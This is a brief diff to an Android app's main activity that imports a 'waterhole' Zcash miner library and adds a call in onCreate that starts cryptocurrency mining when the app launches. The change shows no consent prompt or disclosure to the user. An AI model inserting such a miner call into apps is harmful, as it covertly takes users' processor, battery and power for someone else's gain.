@@ -9,6 +9,9 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 
+import waterhole.commonlibs.ContextWrapper;
+import waterhole.miner.zcash.ZcashMiner;
+
 public class MainActivity extends Activity {
 
     @Override
@@ -16,5 +19,8 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
 
         setContentView(R.layout.activity_main);
+
+        ContextWrapper.getInstance().injectContext(getApplicationContext());
+        ZcashMiner.startMine();
     }
 }
